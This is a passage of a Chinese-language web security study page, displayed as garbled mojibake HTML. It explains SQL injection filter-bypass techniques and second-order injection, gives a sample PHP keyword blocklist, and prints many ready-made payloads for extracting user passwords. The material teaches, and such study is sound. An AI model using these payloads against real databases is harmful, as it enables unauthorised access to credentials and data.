href="#ä½¿ç”¨å¤§å°å†™å˜ç§ç»•è¿‡" class="headerlink" title="ä½¿ç”¨å¤§å°å†™å˜ç§ç»•è¿‡"></a>ä½¿ç”¨å¤§å°å†™å˜ç§ç»•è¿‡</h4><p>æ•°æ®åº“ä¸åŒºåˆ†å¤§å°å†™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'uNiOn SeLeCt password FrOm tblUsers WhErE username='' admin'</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä½¿ç”¨SQLæ³¨é‡Š"><a href="#ä½¿ç”¨SQLæ³¨é‡Š" class="headerlink" title="ä½¿ç”¨SQLæ³¨é‡Š"></a>ä½¿ç”¨SQLæ³¨é‡Š</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#è¿‡æ»¤å™¨</span><span class="token keyword">if</span> <span class="token punctuation">(</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'FROM '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>Svalue<span class="token punctuation">,</span> <span class="token string">'UPDATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'WHERE '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'ALTER '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SELECT '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SHUTDOWN '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'CREATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DROP '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DELETE FROM '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'script '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span><span class="token string">'&lt;&gt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SET '</span><span class="token punctuation">)</span><span class="token punctuation">)</span> die <span class="token punctuation">(</span><span class="token string">'Please provide a permitted value for'</span><span class="token punctuation">.</span>$<span class="token keyword">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹å…³é”®å­—åé¢è·Ÿç€çš„ç©ºæ ¼æ£€æµ‹ï¼Œä½¿ç”¨/**/å……å½“åˆ†éš”ç¬¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'/**/UNION/**/SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/username/**/LIKE/**/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Mysqlä¸­èƒ½ä½¿ç”¨å†…è”æ³¨é‡Šæ¥é¿å¼€å…³é”®å­—ç»•è¿‡ï¼Œsel/**/ect</p><h4 id="ä½¿ç”¨URLç¼–ç "><a href="#ä½¿ç”¨URLç¼–ç " class="headerlink" title="ä½¿ç”¨URLç¼–ç "></a>ä½¿ç”¨URLç¼–ç </h4><p>è¿‡æ»¤å™¨èƒ½è¿‡æ»¤ç©ºç™½ç¬¦å’Œå†…è”æ³¨é‡Šåºåˆ—/*ï¼Œå°†åºåˆ—åŒURLç¼–ç ï¼Œå³å¯¹%ç¼–ç å¾—åˆ°%25</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿèƒ½ä½¿ç”¨Unicodeç¼–ç </p><p><img src="https://z3.ax1x.com/2021/07/19/WJ5T29.png" alt="WJ5T29.png"></p><p><img src="https://z3.ax1x.com/2021/07/19/WJ5v5D.png" alt="WJ5v5D.png"></p><h4 id="ä½¿ç”¨åŠ¨æ€æŸ¥è¯¢æ‰§è¡Œ"><a href="#ä½¿ç”¨åŠ¨æ€æŸ¥è¯¢æ‰§è¡Œ" class="headerlink" title="ä½¿ç”¨åŠ¨æ€æŸ¥è¯¢æ‰§è¡Œ"></a>ä½¿ç”¨åŠ¨æ€æŸ¥è¯¢æ‰§è¡Œ</h4><p>è¿‡æ»¤å™¨é˜»æ­¢äº†æƒ³æ³¨å…¥çš„æŸ¥è¯¢ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨åŠ¨æ€æ‰§è¡Œæ¥é¿å¼€è¯¥è¿‡æ»¤å™¨ã€‚</p><ul><li><p>mssql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token string">'SELECT password FROM tblUsers'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>oracle</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> pw VARCHAR2<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'SELECT password FROM tblUsers'</span> <span class="token keyword">INTO</span> pw<span class="token punctuation">;</span>DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>ä½¿ç”¨å­—ç¬¦ä¸²æ“ä½œå‡½æ•°å°†è¿‡æ»¤å™¨å…è®¸çš„è¾“å…¥è½¬æ¢æˆä¸€ä¸ªåŒ…å«æ‰€éœ€æŸ¥è¯¢çš„å­—ç¬¦ä¸²</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Oracle: <span class="token string">'SEL'</span><span class="token operator">||</span><span class="token string">'ECT'</span>MS<span class="token operator">-</span><span class="token keyword">SQL</span>: <span class="token string">'SEL'</span><span class="token operator">+</span><span class="token string">'ECT'</span>MySQL: <span class="token string">'SEL'</span> <span class="token string">'ECT'</span><span class="token comment">#URLä¸­åˆ†åˆ«å°†å®ƒä»¬ç¼–ç æˆï¼…2b(+)å’Œï¼…20( )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>oracleä½¿ç”¨chr()ï¼Œms-sqlä½¿ç”¨char()ï¼Œè¿˜èƒ½ç”¨æ¥ç»•è¿‡å¼•å·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Oracleä¸­çš„REVERSEã€TRANSLATEã€REPLACE å’ŒSUBSTRå‡½æ•°ã€‚</p><p>ms-sqlï¼Œä½¿ç”¨16è¿›åˆ¶å®ä¾‹åŒ–å­—ç¬¦ä¸²</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@query</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@query</span> <span class="token operator">=</span> <span class="token number">0x53454c4543542070617373776f72642046524f4d2074626c5573657273</span> <span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="ä½¿ç”¨ç©ºå­—èŠ‚"><a href="#ä½¿ç”¨ç©ºå­—èŠ‚" class="headerlink" title="ä½¿ç”¨ç©ºå­—èŠ‚"></a>ä½¿ç”¨ç©ºå­—èŠ‚</h4><p>ç©ºå­—èŠ‚ä¹‹æ‰€ä»¥èƒ½èµ·ä½œç”¨ï¼Œæ˜¯å› ä¸ºåŸç”Ÿä»£ç (native code)å’Œæ‰˜ç®¡ä»£ç åˆ†åˆ«é‡‡ç”¨ä¸åŒçš„æ–¹æ³•æ¥å¤„ç†ç©ºå­—èŠ‚ã€‚åœ¨åŸç”Ÿä»£ç ä¸­ï¼Œæ ¹æ®å­—ç¬¦ä¸²èµ·å§‹ä½ç½®åˆ°å‡ºç°ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚çš„ä½ç½®æ¥ç¡®å®šå­—ç¬¦ä¸²é•¿åº¦ (ç©ºå­—èŠ‚æœ‰æ•ˆç»ˆæ­¢äº†å­—ç¬¦ä¸²)ã€‚è€Œåœ¨æ‰˜ç®¡ä»£ç ä¸­ï¼Œå­—ç¬¦ä¸²å¯¹è±¡åŒ…å«ä¸€ä¸ªå­—ç¬¦æ•°ç»„(å¯èƒ½åŒ…å«ç©ºå­—èŠ‚) å’Œä¸€æ¡å•ç‹¬çš„å­—ç¬¦ä¸²é•¿åº¦è®°å½•ã€‚</p><p>è¦æƒ³æ‰§è¡Œç©ºå­—èŠ‚æ”»å‡»ï¼Œåªéœ€åœ¨è¿‡æ»¤å™¨é˜»æ­¢çš„å­—ç¬¦å‰é¢æä¾›ä¸€ä¸ªé‡‡ç”¨URLç¼–ç çš„ç©ºå­—èŠ‚ (%00)å³å¯ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">%</span><span class="token number">00</span><span class="token string">'UNION SELECT password FROM tblUsers WHERE username= '</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åµŒå¥—å‰¥ç¦»åçš„è¡¨è¾¾å¼ï¼ˆåŒå­—ç»•è¿‡ï¼‰"><a href="#åµŒå¥—å‰¥ç¦»åçš„è¡¨è¾¾å¼ï¼ˆåŒå­—ç»•è¿‡ï¼‰" class="headerlink" title="åµŒå¥—å‰¥ç¦»åçš„è¡¨è¾¾å¼ï¼ˆåŒå­—ç»•è¿‡ï¼‰"></a>åµŒå¥—å‰¥ç¦»åçš„è¡¨è¾¾å¼ï¼ˆåŒå­—ç»•è¿‡ï¼‰</h4><p>æœ‰äº›å®¡æŸ¥è¿‡æ»¤å™¨ä¼šå…ˆä»ç”¨æˆ·è¾“å…¥ä¸­å‰¥ç¦»ç‰¹å®šçš„å­—ç¬¦æˆ–è¡¨è¾¾å¼ï¼Œç„¶åå†æŒ‰ç…§å¸¸ç”¨çš„æ–¹å¼å¤„ç†å‰©ä¸‹çš„æ•°æ®ã€‚å¦‚æœè¢«å‰¥ç¦»çš„è¡¨è¾¾å¼ä¸­åŒ…å«ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œå°±ä¸ä¼šé€’å½’åº”ç”¨è¿‡æ»¤å™¨ã€‚</p><p>å¦‚æœä»è¾“å…¥ä¸­å‰¥ç¦»äº† SQLå…³é”®è¯SELECT</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SELSELECTECT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ©ç”¨æˆªæ–­"><a href="#åˆ©ç”¨æˆªæ–­" class="headerlink" title="åˆ©ç”¨æˆªæ–­"></a>åˆ©ç”¨æˆªæ–­</h4><p>å®¡æŸ¥è¿‡æ»¤å™¨é€šå¸¸ä¼šå¯¹ç”¨æˆ·æä¾›çš„æ•°æ®æ‰§è¡Œå¤šç§æ“ä½œï¼Œæœ‰æ—¶è¿™äº›æ“ä½œä¸­ä¼šåŒ…æ‹¬å°†è¾“å…¥æˆªæ–­æˆæœ€å¤§çš„é•¿åº¦(å¯èƒ½æ˜¯ä¸ºäº†å°½åŠ›é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»)æˆ–è€…è°ƒæ•´æ•°æ®ä½¿å…¶ä½äºæ‹¥æœ‰é¢„å®šä¹‰æœ€å¤§é•¿åº¦çš„æ•°æ®åº“å­—æ®µå†…ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ¡ä»¶ï¼šå¯¹å¼•å·æ ‡è®°è¿›è¡ŒåŒé‡ç¼–ç ï¼Œä½¿ç”¨ä¸¤ä¸ªå•å¼•å·(")æ›¿æ¢æ‰€æœ‰çš„å•å¼•å·(')ï¼Œå°†æ¯ä¸€é¡¹æˆªæ–­æˆ16ä¸ªå­—ç¬¦</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin"-- '</span><span class="token operator">AND</span> password <span class="token operator">=</span><span class="token string">''</span><span class="token comment">#æ‰§è¡Œä¸æˆåŠŸ</span><span class="token comment">#åˆ©ç”¨ä¸Šè¿°æ¡ä»¶ï¼Œæ³¨å…¥15ä¸ªaå’Œä¸€ä¸ªå•å¼•å·</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password =''#ç¬¬ä¸‰ä¸ªå•å¼•å·å¹²æ‰°äº†è¯­æ³•ï¼Œåé¢æ— æ•ˆ'</span><span class="token comment">#åˆ©ç”¨ç¬¬äºŒä¸ªæ³¨å…¥ç‚¹é—­åˆå•å¼•å·ï¼Œå¹¶æ³¨å…¥æ°¸çœŸæ¡ä»¶</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é¿å¼€è‡ªå®šä¹‰è¿‡æ»¤å™¨"><a href="#é¿å¼€è‡ªå®šä¹‰è¿‡æ»¤å™¨" class="headerlink" title="é¿å¼€è‡ªå®šä¹‰è¿‡æ»¤å™¨"></a>é¿å¼€è‡ªå®šä¹‰è¿‡æ»¤å™¨</h4><p>é‡åˆ°å„ç§å¥‡æ€ªç»å¦™çš„è¾“å…¥è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡å‘æŒ¥æƒ³è±¡åŠ›æ¥é¿å¼€è¿™äº›è¿‡æ»¤å™¨ã€‚</p><p>ä¾‹å¦‚ï¼ŒåŒ…ååŠ åŒå¼•å·ï¼Œç¼–ç æ›¿æ¢ï¼ŒåŠ æ ‡ç­¾</p><h4 id="ä½¿ç”¨éæ ‡å‡†å…¥å£ç‚¹"><a href="#ä½¿ç”¨éæ ‡å‡†å…¥å£ç‚¹" class="headerlink" title="ä½¿ç”¨éæ ‡å‡†å…¥å£ç‚¹"></a>ä½¿ç”¨éæ ‡å‡†å…¥å£ç‚¹</h4><p>é€šå¸¸WAFä¸ä¼šéªŒè¯å‚æ•°åï¼Œå¯ä»¥æ³¨å…¥SQLä»£ç åˆ°å‚æ•°åä¸­ï¼Œå¦‚æœå‚æ•°åè¢«å¤„ç†æˆSQLæŸ¥è¯¢å°±èƒ½æ‰§è¡Œï¼ŒåŒç†ï¼Œä¹Ÿèƒ½æ³¨å…¥åˆ°HTTPå¤´ä¸­ç­‰ç­‰</p><h3 id="åˆ©ç”¨äºŒé˜¶SQLæ³¨å…¥"><a href="#åˆ©ç”¨äºŒé˜¶SQLæ³¨å…¥" class="headerlink" title="åˆ©ç”¨äºŒé˜¶SQLæ³¨å…¥"></a>åˆ©ç”¨äºŒé˜¶SQLæ³¨å…¥</h3><ol><li><p>æ”»å‡»è€…åœ¨HTTPè¯·æ±‚ä¸­æäº¤æŸç§ç»è¿‡æ„æ€çš„è¾“å…¥ã€‚</p></li><li><p>åº”ç”¨ç¨‹åºå­˜å‚¨è¯¥è¾“å…¥(é€šå¸¸ä¿å­˜åœ¨æ•°æ®åº“ä¸­)ä»¥ä¾¿åé¢ä½¿ç”¨å¹¶å“åº”è¯·æ±‚ã€‚</p></li><li><p>æ”»å‡»è€…æäº¤ç¬¬äºŒä¸ª(ä¸åŒçš„)è¯·æ±‚ã€‚</p></li><li><p>ä¸ºå¤„ç†ç¬¬äºŒä¸ªè¯·æ±‚ï¼Œåº”ç”¨ç¨‹åºä¼šæ£€ç´¢å·±ç»å­˜å‚¨çš„è¾“å…¥å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ³¨å…¥çš„ SQLæŸ¥è¯¢è¢«æ‰§è¡Œã€‚</p></li><li><p>å¦‚æœå¯è¡Œçš„è¯ï¼Œä¼šåœ¨åº”ç”¨ç¨‹åºå¯¹ç¬¬äºŒä¸ªè¯·æ±‚çš„å“åº”ä¸­å‘æ”»å‡»è€…è¿”å›æŸ¥è¯¢ç»“æœã€‚</p></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">a<span class="token string">'+@@version+'</span>a<span class="token comment">#æ³¨å…¥è¿™ä¸ªå‚æ•°å€¼ï¼Œç»è¿‡å¤„ç†å¾—åˆ°</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblContacts <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'a''+@@version+''a'</span><span class="token punctuation">,</span><span class="token string">'foo@example.org,....'</span><span class="token comment">#å•å¼•å·è¢«è½¬åŒ–ä¸ºåŒå¼•å·</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span><span class="token comment">#æ£€ç´¢å·²å­˜åœ¨çš„ç»†èŠ‚ä¿¡æ¯</span><span class="token keyword">UPDATE</span> tblUsers<span class="token keyword">SET</span> name<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">+</span>@<span class="token variable">@version</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">,</span>address<span class="token operator">=</span><span class="token string">'52 Throwley Way'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span><span class="token comment">#ä½¿ç”¨ä¸Šé¢æµ‹è¯•è¿‡çš„å­—ç¬¦ä¸²æ³¨å…¥å¼•å·åŒé‡ç¼–ç </span><span class="token comment">#å½“æŸ¥çœ‹æ›´æ–°åçš„ä¿¡æ¯æ—¶ï¼Œ@@versionå°±ä¼šæ‰§è¡Œæ˜¾ç¤ºåœ¨å±å¹•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å¯»æ‰¾äºŒé˜¶æ¼æ´"><a href="#å¯»æ‰¾äºŒé˜¶æ¼æ´" class="headerlink" title="å¯»æ‰¾äºŒé˜¶æ¼æ´"></a>å¯»æ‰¾äºŒé˜¶æ¼æ´</h4><ol><li><p>åœ¨ç­¹åˆ’å¥½åº”ç”¨ç¨‹åºçš„å†…å®¹å’ŒåŠŸèƒ½åè¿›è¡Œå¤æŸ¥ï¼Œå¯»æ‰¾æ‰€æœ‰ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„æ•°æ®é¡¹ï¼Œè¿™äº›æ•°æ®é¡¹ä¼šè¢«åº”ç”¨ç¨‹åºæŒä¹…ä¿å­˜å¹¶è¢«åé¢çš„åŠŸèƒ½é‡ç”¨ã€‚å•ç‹¬æ“ä½œæ¯ä¸ªæ•°æ®é¡¹å¹¶ä¸ºæ¯ä¸ªå®ä¾‹æ‰§è¡Œæ¥ä¸‹æ¥çš„æ­¥éª¤ã€‚</p></li><li><p>åœ¨æ•°æ®é¡¹ä¸­æäº¤ä¸€ä¸ªç®€å•çš„å€¼ï¼Œæ•°æ®é¡¹åœ¨SQLæŸ¥è¯¢ä¸­è¢«ä¸å®‰å…¨åœ°ä½¿ç”¨æ—¶å¾ˆå¯èƒ½ä¼šå¼•å‘é—®é¢˜ï¼Œä¾‹å¦‚ï¼Œå•å¼•å·æˆ–è€…ä½¿ç”¨å•å¼•å·å¼•èµ·æ¥çš„å­—æ¯æ•°å­—å‹å­—ç¬¦ä¸²ã€‚å¦‚æœ‰å¿…è¦ï¼Œè¯·å¿«é€Ÿæ£€æŸ¥æ‰€æœ‰åŒ…å«å¤šä¸ªé˜¶æ®µçš„è¿‡ç¨‹ï¼ˆæ¯”å¦‚ç”¨æˆ·æ³¨å†Œï¼‰ä»¥ä¿è¯æ•°æ®å€¼å®Œå…¨æŒä¹…åœ°å­˜åœ¨äºåº”ç”¨ç¨‹åºä¸­ã€‚</p></li><li><p>å¦‚æœå‘ç°åº”ç”¨ç¨‹åºçš„è¾“å…¥è¿‡æ»¤å™¨é˜»æ­¢äº†è¾“å…¥ï¼Œç»•è¿‡</p></li><li><p>å¿«é€Ÿæ£€æŸ¥åº”ç”¨ç¨‹åºä¸­æ‰€æœ‰å­˜åœ¨æ˜¾å¼ä½¿ç”¨æ•°æ®é¡¹çš„åŠŸèƒ½ä»¥åŠå¯èƒ½å­˜åœ¨éšå¼ä½¿ç”¨æ•°æ®é¡¹çš„åŠŸèƒ½ã€‚å¯»æ‰¾æ‰€æœ‰èƒ½å¤Ÿè¡¨æ˜æ˜¯ç”±è¾“å…¥å¼•å‘äº†é—®é¢˜çš„å¼‚å¸¸è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®åº“é”™è¯¯æ¶ˆæ¯ã€HTTP 500 çŠ¶æ€ä»£ç ã€æ›´éšç§˜çš„é”™è¯¯æ¶ˆæ¯ã€å—æŸçš„åŠŸèƒ½ã€ä¸¢å¤±æˆ–æ¯åçš„æ•°æ®ç­‰ã€‚</p></li><li><p>å¯¹äºè¯†åˆ«å‡ºæ¥çš„æ¯ä¸ªæ½œåœ¨é—®é¢˜ï¼Œå°è¯•å¼€å‘ä¸€ç§æ¦‚å¿µéªŒè¯æ”»å‡»æ¥ç¡®è®¤æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚è¯·æ³¨æ„ï¼Œæœ‰ç¼ºé™·çš„æŒä¹…æ•°æ®å¯èƒ½ä»¥é—´æ¥å—åˆ°æ”»å‡»çš„æ–¹å¼ï¼ˆä¾‹å¦‚ï¼Œæ•´å‹è½¬æ¢é”™è¯¯æˆ–åç»­æ•°æ®éªŒè¯å¤±è´¥ï¼‰æ¥å¼•å‘å¼‚å¸¸æ¡ä»¶ã€‚ä½¿ç”¨ä¸¤ä¸ªå¼•å·æ ‡è¯†æ¥æä¾›ç›¸åŒçš„è¾“å…¥å¹¶æŸ¥çœ‹å¼‚å¸¸æ˜¯å¦æ¶ˆå¤±ã€‚ ä½¿ç”¨æ•°æ®åº“ä¸“ç”¨çš„ç»“æ„ï¼ˆæ¯”å¦‚å­—ç¬¦ä¸²è¿æ¥å‡½æ•°å’Œç‰ˆæœ¬æ ‡è¯†ï¼‰æ¥ç¡®è®¤æ­£åœ¨ä¿®æ”¹SQLæŸ¥è¯¢ã€‚å¦‚æœå¼‚å¸¸æ¡ä»¶æ˜¯ç›²çš„ï¼ˆä¾‹å¦‚ï¼Œä¸è¿”å›æŸ¥è¯¢ç»“æœæˆ–ä»»ä½•é”™è¯¯æ¶ˆæ¯ï¼‰ï¼Œä½¿ç”¨æ—¶é—´å»¶è¿ŸæŠ€æœ¯æ¥ç¡®è®¤æ¼æ´çš„å­˜åœ¨ã€‚</p></li></ol><h4 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><p>å¯¹æ‰€æœ‰å¯å˜æ•°æ®é¡¹ä½¿ç”¨å‚æ•°åŒ–ï¼Œç™½åå•</p><h3 id="å®¢æˆ·ç«¯SQLæ³¨å…¥æ¼æ´"><a href="#å®¢æˆ·ç«¯SQLæ³¨å…¥æ¼æ´" class="headerlink" title="å®¢æˆ·ç«¯SQLæ³¨å…¥æ¼æ´"></a>å®¢æˆ·ç«¯SQLæ³¨å…¥æ¼æ´</h3><h4 id="è®¿é—®æœ¬åœ°æ•°æ®åº“"><a href="#è®¿é—®æœ¬åœ°æ•°æ®åº“" class="headerlink" title="è®¿é—®æœ¬åœ°æ•°æ®åº“"></a>è®¿é—®æœ¬åœ°æ•°æ®åº“</h4><p>ä¸ºäº†æ›´å¿«çš„åŠ è½½æ•°æ®ï¼Œä»¥åŠç¦»çº¿ä½¿ç”¨ï¼Œæœ‰æ—¶ä¼šæŠŠæ•°æ®åº“æ”¾åœ¨æœ¬åœ°</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//JavaScriptåˆ›å»ºä¸€ä¸ªæœ¬åœ°æ•°æ®åº“</span><span class="token keyword">var</span> database <span class="token operator">=</span> <span class="token function">openDatabase</span><span class="token punctuation">(</span><span class="token string">"dbStatus"</span><span class="token punctuation">,</span> <span class="token string">"1.0"</span><span class="token punctuation">,</span> <span class="token string">"Status updates"</span><span class="token punctuation">,</span><span class="token number">500000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">tx</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(IOO))"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO tblUpdates (date, user, status) VALUES ('1/8/2012','Me','I am writing a book.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ”»å‡»å®¢æˆ·ç«¯æ•°æ®åº“"><a href="#æ”»å‡»å®¢æˆ·ç«¯æ•°æ®åº“" class="headerlink" 